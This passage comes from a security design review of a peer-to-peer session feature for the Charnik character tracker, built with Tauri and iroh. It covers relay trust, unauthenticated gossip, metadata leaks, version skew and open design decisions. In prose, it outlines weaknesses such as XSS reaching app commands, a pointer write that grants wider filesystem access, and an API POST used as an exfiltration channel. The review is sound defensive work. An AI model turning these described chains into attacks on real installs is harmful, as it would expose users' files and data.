    `handle_connection`; nothing checks the peer.
  - `src/api.rs:363-372` — `Message { content, scope, delivered_from }`, documented as "The endpoint
    that delivered the message. This is not the same as the original author."
  - `src/proto/plumtree.rs:151-161` — the wire payload is `{id, content, scope}`: no author field,
    no signature.
  - `src/proto.rs:69` — `DEFAULT_MAX_MESSAGE_SIZE` is 4096 bytes; a character does not fit, so a
    second channel is needed regardless.
- **How to verify.** Three endpoints: A and B on a topic, C given only the topic id and A's id.
  C subscribes and broadcasts; B receives it with `delivered_from` equal to A or C depending on the
  path.
- **Suggested guard.** Do not use gossip for a table of a GM and a handful of players. A star of
  direct QUIC connections to the GM gives an authenticated peer id per connection
  (`Connection::remote_id`), per-peer approval, per-peer rate limits and revocation by closing one
  connection. If gossip is kept for discovery, every payload is signed by its author's endpoint key
  and encrypted to a table key the GM hands out after approval — and rotating that key is the only
  way to remove someone.

### S-11 — A ticket is an address, not a secret; approval must be bound to the key, and the default preset publishes the address

- **Kind:** spec. **Severity:** high. **Confidence:** high for the mechanism, medium for exact
  record contents.
- **Hypothesis.** Nothing in an `EndpointAddr` is confidential by design, so "an outsider with a
  leaked ticket" is the normal case. With the `N0` preset the endpoint also publishes its current
  relay (or, with relays off, its IP addresses) to n0's DNS, resolvable by anyone who knows the
  endpoint id. Players and GM learn each other's public and LAN addresses once a direct path
  forms.
- **Evidence.** `iroh/src/endpoint/presets.rs:95-101, 125-133` (publishes to and resolves from
  `iroh.link`); `:142-147` (`N0DisableRelay` "publishes IP addresses rather than relay urls");
  `iroh/src/defaults.rs:26-43` (four n0-run production relays).
- **Consequences for the design.**
  - Approval shows and pins the joiner's endpoint id; the GM approves a key, not a ticket. A fake GM
    is whoever gets a player to accept a ticket, so the player's side pins the GM's id on first
    contact and warns when it changes.
  - A ticket that should be single-use needs its own secret (a random join token the GM's app
    checks and burns), because the transport will not provide one.
  - "No server anyone deploys" is true of the maintainers and false of the system: it depends on
    n0's relays and DNS. Their availability, rate limits and terms are a dependency to state, and a
    relay operator sees who talks to whom and when, though not what.
  - A long-lived endpoint key is a stable public identifier; anyone who has seen it once can tell
    when that player is online.
- **How to verify.** Bind an endpoint with `presets::N0`, then resolve its id from a second process
  with only the id.
- **Suggested guard.** The spec states the metadata each party learns. Offer a relay-only mode that
  never reveals IP addresses to peers (`clear_ip_transports`, `iroh/src/endpoint.rs:510`), and
  decide whether keys are per table rather than per install.

### S-12 — iroh's defaults ask the router to open a port and use private Apple APIs

- **Kind:** spec. **Severity:** medium. **Confidence:** high.
- **Evidence.** `iroh/Cargo.toml:150` — default features are `metrics`, `fast-apple-datapath`,
  `portmapper`, `tls-ring`. `iroh/src/portmapper.rs:14-33` — `PortmapperConfig::Enabled` "is the
  default" and its UPnP discovery "can … trigger firewall prompts"; the alternative costs "worse
  direct connectivity behind some NATs". `iroh/Cargo.toml:157-158` — `fast-apple-datapath`: "Use
  private Apple APIs to send multiple packets in a single syscall".
- **Why it matters.** An opt-in module that silently reconfigures the user's router is a surprise,
  and a UPnP mapping outlives a crashed app until its lease ends. Private API use is a review risk
  for the planned iOS build.
- **Suggested guard.** `default-features = false`; `PortmapperConfig::Disabled` unless the user
  turns it on; leave `fast-apple-datapath` off. No endpoint is bound until the user enables table
  link — the module being compiled in must not mean a socket is open.

### F-07 — Duplicate effect ids from a peer break the keyed lists that render them

- **Kind:** present. **Severity:** medium. **Confidence:** medium (Svelte's behaviour on a duplicate
  key is unverified here: it throws in development; production behaviour was not driven).
- **Evidence.** `src/routes/combat/blocks/panels/EffectsPanel.svelte:149,172` key the buff and
  debuff lists by `e.iid`; `src/lib/character/schema.ts:206` requires `iid` only to be non-empty,
  not unique. `removeEffect` filters by `iid` (`effects-editor.svelte.ts:263-269`), so one ✕ removes
  every instance sharing it. Inventory, attack and feature rows are keyed by ids derived from
  content refs (`InventoryPanel.svelte:120`, `AttacksPanel.svelte:95`), which a peer's save also
  controls.
- **How to verify.** Playwright: load a character whose `play.effects` holds two entries with the
  same `iid`; read the Effects panel text and the console.
- **Suggested guard.** The wire schema refuses duplicates; ids minted by a peer are re-minted on
  receipt and mapped, never trusted as local keys.

### F-08 — Version skew has four axes and the save format drops what it does not know

- **Kind:** spec. **Severity:** high. **Confidence:** high for the stripping, medium for the rest.
- **Evidence.** `characterSchema` is a plain `z.object` (`schema.ts:412-419`): unknown keys are
  removed on parse, and `saveCharacter` writes the parsed result (`repository.ts:263, 280`). A
  character that passed through an older peer and came back has lost every field the older build
  did not know. `docs/internals/characters.md:115-117` — before release "the schema may change
  breaking". The effect vocabulary is a second version (a token an older build does not know
  degrades to a note, so the two sides compute different numbers); the content seed version is a
  third (`src/lib/schema/version.ts`, bumped nineteen times); the wire protocol will be a fourth.
- **Suggested guard.** The handshake carries app version, save schema version, effect-vocabulary
  version and protocol version, and refuses or degrades explicitly. A peer never round-trips
  another peer's character: the owner's file is written only by the owner, from the owner's own
  state — which the plan already says, and which this is the reason for.

### F-09 — The module lives in Rust, so the seam, the web build and removability each need a decision

- **Kind:** spec. **Severity:** medium. **Confidence:** high.
- **Evidence.** The Tauri import fence is two eslint rules with four exempt paths
  (`docs/internals/overview.md:34-39`, `eslint.config.js:66-99`); table link needs a fifth, and it
  is the first that is bidirectional — Rust pushes events into the webview rather than answering a
  call. The effects module's removability is asserted by tests that the core does not import it
  (`AGENTS.md` ▸ Hit every surface); nothing equivalent exists for a Rust-side module, where
  "removable" means a Cargo feature, a capability file and a JS seam that all disappear together.
  On the web there is no Rust: iroh does build for browsers (`cfg(wasm_browser)` throughout
  `iroh/src/endpoint/presets.rs:131`) but relay-only, with a different key-storage story.
- **Suggested guard.** One `TableLink` interface beside `Storage`, with a no-op implementation that
  the web build and a build without the Cargo feature both use; a test that the app boots and plays
  with that no-op. Decide whether the web demo ever joins a table before designing the wire format,
  because a browser peer has no file to own.

### F-10 — iroh raises the toolchain floor and is released every few weeks; iroh-gossip is still 0.x

- **Kind:** spec. **Severity:** medium. **Confidence:** high.
- **Evidence.** `iroh/Cargo.toml:13` and `iroh-gossip/Cargo.toml:13` require Rust 1.91;
  `src-tauri/Cargo.toml:9` declares 1.77.2. iroh's `CHANGELOG.md` lists 1.0.0 on 2026-06-15 and
  1.1.0, 1.2.0, 1.3.0 on 2026-08-25, 09-09 and 09-28; iroh-gossip is at 0.101.0. iroh's own
  lockfile has 587 packages against the app's 551, with a second QUIC stack (`noq`) beside the
  `quinn` the app already carries through `tauri-plugin-http`.
- **Why it matters.** Two peers on different iroh minors must still talk, so the app's release
  cadence becomes coupled to a dependency's wire compatibility — a property to test, not assume.
  Build time and binary size for all five targets are unmeasured.
- **How to verify.** A scratch crate with `tauri` and `iroh`: `cargo build --release --timings`,
  binary size before and after, and a cross-version connect test between two pinned iroh versions.
- **Suggested guard.** Pin exact versions; an ALPN that carries the app's own protocol version;
  CI job that connects the previous release to the current one.

### F-11 — Mobile kills the connection and the tests cannot see the network

- **Kind:** spec. **Severity:** medium. **Confidence:** medium (not driven on a device).
- **Hypothesis.** On Android and iOS a backgrounded app loses its sockets within seconds to
  minutes. A GM message sent while the player's phone is locked is lost unless something queues it,
  and a queue raises ordering, replay and staleness ("apply 12 damage" delivered an hour late).
  Wall clocks differ between devices, so order cannot come from timestamps.
- **Evidence.** `src-tauri/src/lib.rs:117` is already a mobile entry point; nothing in the app
  handles a lifecycle event today. `docs/internals/testing.md` and `AGENTS.md` ▸ Verifying require
  filesystem and network work to be verified on the real desktop app; a `MemoryStorage` test
  "proves nothing". There is no harness for two app instances.
- **Suggested guard.** Messages carry a per-sender sequence number and a table epoch; the receiver
  applies in order, rejects replays and shows anything older than a threshold as expired rather
  than applying it. No queue on the sender beyond the live connection in the first version: a
  message is delivered now or reported as not delivered. For CI, the protocol is a pure Rust state
  machine tested over in-memory streams; one job runs two real endpoints against a local relay
  (`iroh`'s `test-utils` feature provides one).

Everything above this line was written before the prior review was opened.

## Findings from published work

Searched after the findings above were written. Each entry says whether it applies here.

- **L-01 — iroh's relay server had a parsing vulnerability three weeks after 1.0.** iroh 1.0.2 fixed
  a missing length check in the relay server's parsing of client-to-relay datagram frames; n0's
  public relays were patched [lit, iroh blog "iroh 1.0.2"]. *Applies:* it is the relay **server**,
  so the app's client is not the affected side at the pinned 1.3.0 — but it prices the prior
  review's advice to self-host a relay (its V2, A12): whoever self-hosts inherits the patch duty,
  and the trust assumption "iroh's internals are out of scope" has a recent counter-example.
- **L-02 — Tauri once let remote-origin iframes reach IPC without a capability** (CVE-2024-35222,
  fixed before 2.0 stable) [lit, NVD]. *Does not apply at 2.11.5*, and DOMPurify removes `<iframe>`
  here (S-07). Recorded because S-02 is the same class — a command reachable from a context the
  capability file appears to exclude — and this one is by configuration, not by bug.
- **L-03 — Equivocation.** In peer-to-peer collaboration a malicious peer can send different
  versions of one operation to different collaborators and leave them permanently inconsistent
  [lit, Kleppmann, "Making CRDTs Byzantine fault tolerant", 2022]. *Applies to the star topology
  S-10 recommends:* the GM is the hub and can tell each player something different; signatures
  prove authorship, not that everyone saw the same thing. For a game where the GM is trusted to lie
  this is acceptable — the spec should say so in those words rather than leave it implied.
- **L-04 — Peer sampling under Byzantine members.** Gossip membership protocols can be biased by
  malicious members until honest nodes see only attackers (eclipse). **Unverified:** known here
  only from the titles and abstracts a search returned ("Brahms: Byzantine resilient random
  membership sampling"; "Secure peer sampling"); the papers were not read and nothing was checked
  against iroh-gossip's HyParView implementation. *Would apply only if gossip is used.*

## Citation check

An independent agent, given only the claims and their sources and told to assume each might be
wrong, re-read 29 statements this document makes about code it does not own and about published
work: 18 about iroh and iroh-gossip at the pinned commits, 8 about Tauri, its plugins, `dirs` and
`tracing` at the locked versions, 3 from the web. It confirmed both checkout hashes first.

**Result: 27 confirmed, 2 partly, 0 wrong, 0 unreachable.**

- *Partly* — the iroh release dates are right, but the changelog is at the repository root, not
  inside the `iroh/` crate. This document cites it as iroh's `CHANGELOG.md`; read that as the root
  file.
- *Partly* — the equivocation claim (L-03) is supported by Kleppmann's 2022 paper, which says a
  Byzantine node "may generate several distinct updates with the same sequence number, and send
  them to different nodes"; a 2025 keynote page found by the same search carries only an abstract
  and does not support it. L-03 cites the paper.

Precisions the check added, folded in here rather than left implicit:

- **S-09.** No allowlist on relay URLs exists anywhere in `iroh/src`: `RelayMap::contains` is
  defined (`iroh-relay/src/relay_map.rs:112`) and never called there. The only setting that stops
  the dial is `RelayMode::Disabled`, which removes relays altogether. `before_connect` fires for
  `Endpoint::connect` and `connect_with_opts` only, so it guards the app's own dials and nothing
  else.
- **S-09.** The relay handshake uses two fixed strings, one per path: a challenge signature and a
  TLS keying-material export.
- **S-11.** The `N0` preset uses n0's staging relays when iroh's test infrastructure flag is set —
  a build with `test-utils` enabled would ship pointing at them.
- **L-01.** The 1.0.2 bug was a panic: one malformed frame from any client that could connect
  crashed the relay. Clients were not affected.
- **L-02.** NVD's prose gives the fixed versions as 1.6.7 and 2.0.0-beta.19; its affected-range
  data lists beta.19 as affected. Either way it predates the version in use.
- **Opener (Gaps, "Wrong or overstated" 2).** The `allow-open-path` permission is described by the
  plugin as "without any pre-configured scope", and the only scope the app's capability brings in
  is the default URL list, so `open_path` is refused. That part is now source-confirmed; what the
  two Settings buttons do on a running app is still unobserved.

Not sent to the check, and so resting on this review's own reading: every `file:line` into
Charnik's `src/` (re-read at the time of writing, at the commit named above), the two measurements
(S-06, S-07), and L-04, which is marked unverified where it stands.

## Gaps in the prior review

`table-link-threats.md` was read only after everything above the marker was written. It is careful
and most of its catalog stands. Its P9, W1–W4, A5, A8/E6 and A10/I2 reach the same conclusions as
S-01, S-07, S-08, S-12 and S-10 here by independent routes, which is the strongest evidence either
document has. What follows is what it misses, gets wrong or under-weights.

**It is pinned to an older tree.** It cites Charnik `9e4bcebf` (0.7.0); the tree reviewed here is 81
commits later. Its line numbers have moved (`schema.ts` `notes` L179 → 198, `uiSchema` L293 → 334,
`textOverrides` L315 → 362; `repository.ts` L96–98 → 97–99, L324–332 → 333–341; `+layout.svelte`
L156–171 → 157–173), and the installed DOMPurify is 3.4.16, not 3.4.15. None of its conclusions is
overturned by the drift; its citations need re-pinning before anyone checks them.

**Missed — security.**

1. **"`play` only" is not a safety boundary (S-05).** Its A1 makes "network requests may only touch
   `play`, never `build` or `ui`" a MUST and stops there. `play.effects[].effects` is in `play` and
   is a token list: `on_event` hooks that run executor verbs every turn, `plugin:` calls,
   `set_override`. `play.autoCalc`, `play.hp.max`, `play.form.monster` and `play.concentration` are
   in `play` too. The boundary that matters is "ids, never tokens".
2. **Dice formulas (S-06).** Roll requests are named in the design and absent from its M-class. M3
   and M4 bound numbers and strings; a formula is a string that expands into work.
3. **Relay URLs (S-09).** Its P6 makes "endpoint id, relay URL(s), table id and invite secret" the
   required ticket contents, and its E2 allowlists dials by member id. Neither constrains *which*
   relay, and iroh will dial any. Its A6 notes the published record is the relay URL without noting
   that the remote chooses it.
4. **App commands bypass the capability file (S-02).** Its W6 and B5 ask for narrow commands; they
   assume the capability's `windows` list gates them. Without an app manifest in `build.rs` it does
   not.
5. **How logs leak (S-04).** Its E5 says logs must not contain keys. The mechanism — the
   `tracing`/`log` bridge under Cargo feature unification, the process-global logger, and the
   `Webview` log target that hands Rust log lines to page script — is not there, and without the
   mechanism the MUST cannot be tested.
6. **`<style>` elements (S-07).** Its experiment E6 tests the `style` attribute. A `<style>` element
   also survives and is stronger: it restyles the whole document, including the "fixed app-owned
   layer" its W3 relies on for consent prompts. That affects content packs today.
7. **The web build has no CSP.** Its W4 says `default-src 'self'` blocks remote images "today". On
   the web demo there is no policy at all, so the tracking pixel already loads there from any
   content pack. Excluding the web demo from scope hid this.
8. **A second process (F-02).** No single-instance guard: two app instances would bind one endpoint
   key twice and race on one data folder. Not mentioned.

**Missed — architecture.** The prior review has no foot-gun class at all; its boundary B4 says
"apply (actions, bounds, consent)" as if the actions were there to call. F-01 (the builder reverts
network changes), F-02 (no single writer), F-03 (the actions are view-model methods bound to form
fields and route-mounted effects), F-04 (every save rescans the roster), F-05 (no portable
identity), F-07 (duplicate keys) and F-08 (unknown fields stripped on save) are all absent. F-03 is
the one that changes the plan: the first table-link milestone is a refactor with no network in it.

**Wrong or overstated.**

1. **Its A2 recommends the dangerous direction.** "The GM's app can recompute from the reported
   `build`" is S-05 in reverse: recomputing runs the player's tokens through the GM's content and
   consented plugins. Either the GM renders values the player's app derived, or it derives in an
   inert mode. F-06 puts the choice to the spec.
2. **Its W6 lists "open paths" among what XSS can do.** At tauri-plugin-opener 2.5.5,
   `is_path_allowed` requires a matching scope entry, and the capability grants
   `opener:allow-open-path` with none — so every `open_path` is refused. That was good for security
   and meant Settings ▸ "open data folder" and "open log folder" did nothing — confirmed on the
   running app, and fixed by a Rust command that opens only the app's own two folders.
3. **Its P9 is right and marked `[inference]`; it can be `[code]`.** The directory identity on
   Windows and macOS is in the locked crate sources (S-01). It also stops short of the consequence:
   the pointer is re-granted recursively at next launch with no check, so the write is a grant of
   whatever directory the attacker names, the filesystem root included.

**Under-weighted.**

1. **Undo.** Its A1 leans on "journaled with an undo; the existing snapshot rings remain the
   backstop". No undo journal exists; `log.jsonl` is a roll log capped at 100 lines. The save ring
   is two snapshots, at most one per ten minutes (`repository.ts:129-130, 172`): twenty minutes of
   griefed state rotates the last good one out, leaving only the three launch snapshots.
2. **Approval inside the webview.** Its W6 asks for native confirmation of destructive table
   actions. Join approval and proposal acceptance need the same, for the same reason (S-03, S-07):
   a webview dialog can be drawn over, restyled or clicked by page script.
3. **Mobile lifecycle and ordering** appear only as device questions; F-11 argues they decide
   whether a queue exists at all.
4. **Toolchain and release coupling (F-10)** — pre-1.0 gossip is noted, the Rust 1.91 floor and the
   three-week release cadence are not.

## Decisions the spec must make before any code

1. **Who computes?** The player's app derives and sends values with traces, or both sides derive
   and compare a content fingerprint (F-06, S-05).
2. **What is on the wire for a GM request?** A closed list of typed intents naming catalog ids —
   never tokens, never formulas beyond a capped grammar (S-05, S-06).
3. **Where do the actions live?** Pure reducers in `src/lib` that the view-model and the network
   both call, with the route-level `$effect` invariants moved into them (F-03). This is milestone
   zero.
4. **Who writes `character.json`?** One queue per open character, with a revision in the file; the
   builder saves `build` only (F-01, F-02).
5. **What identifies a character, a peer and a table?** A stored random `uid`; per-table endpoint
   keys or one per install; the GM's key pinned on first contact (F-05, S-11).
6. **Topology.** A star of direct connections with per-connection approval, or gossip with an
   application-layer signature and table key. This review recommends the star (S-10).
7. **Which relays, and who says so?** n0's public relays as a stated dependency, an app-side
   allowlist enforced in `before_connect`, relay-only as an option (S-09, S-11).
8. **Where do secrets and approvals live?** Rust-owned storage outside every fs scope, after S-01
   is fixed; native dialogs for pairing and approval (S-01, S-03).
9. **Delivery semantics.** Live-or-fail in the first version, with sequence numbers and expiry; no
   offline queue (F-11).
10. **Does the web demo ever join?** If yes, the wire format must not assume a file-owning peer
    (F-09).
11. **Removability.** A Cargo feature plus a no-op `TableLink` implementation, with a test that the
    app plays without it; no socket until the user enables the module (F-09, S-12).
12. **Version policy.** What the handshake carries and what happens on a mismatch, across app,
    save-schema, effect-vocabulary and protocol versions (F-08).
13. **What ships first, independent of table link.** S-01, S-07 and the single-instance guard are
    defects in today's app.

## What to research next

Not investigated here; each is a question whose answer could change the design.

1. **Run the two unproven chains on a real install.** S-01 end to end on Windows and macOS (write
   the pointer, relaunch, read outside the data folder), and the S-07 form submit on each webview.
   Both are source-read here; neither was driven.
2. **`cargo tree -e features -i tracing`** in a scratch crate with `tauri-plugin-log` and `iroh`,
   then read a session's log file for endpoint ids and addresses (S-04).
3. **What page script can do with `process:default` and `updater:default`.** Whether XSS can force a
   relaunch or drive an update check, and whether `tauri-plugin-http`'s scope limits methods — a
   POST to `api.github.com` is an exfiltration channel the CSP does not see.
4. **Internal deep links in sanitised prose.** `<a href>` to a same-origin route is left to the
   router. Audit every route for an action taken from the URL alone (`/build?…`, the `/dev/*`
   probes that ship in release builds).
5. **zod behaviour on hostile shapes** in the installed version: `__proto__` keys in each
   `z.record`, deep nesting, and whether any `Object.assign`/deep-merge touches parsed saves.
6. **Svelte's production behaviour on duplicate keys** (F-07) and on a 10⁵-row keyed list.
7. **iroh on mobile.** Background limits on Android and iOS, the local-network permission prompt on
   iOS, whether `fast-apple-datapath` can be left off without cost, App Store review of a QUIC
   endpoint that accepts inbound connections.
8. **n0's public relays as a dependency.** Terms, rate limits, what they log, and what the app does
   when they are unreachable — measured from two real networks.
9. **Build cost.** Clean and incremental build time and installer size with iroh, on all targets,
   and whether the Rust 1.91 floor breaks any current CI image.
10. **Cross-version wire compatibility** between two iroh minors, as a CI job.
11. **Key storage per platform.** Keychain, Credential Manager, Secret Service, Android Keystore —
    what Tauri mobile can reach, and what a backup or a folder sync carries.
12. **Pairing ceremonies.** Whether a short authentication string compared aloud is usable at a
    real table, against a QR scan in person; and what users do when the GM's key changes.
13. **An inert derive mode.** What it takes to derive a foreign character with `on_event`,
    `plugin:` and the executor disabled, and whether anything else in the pipeline acts on data.
14. **Existing tools.** How other virtual tabletops and character trackers that sync player sheets
    to a GM handle authority, conflicts and griefing — their incident reports are free lessons.
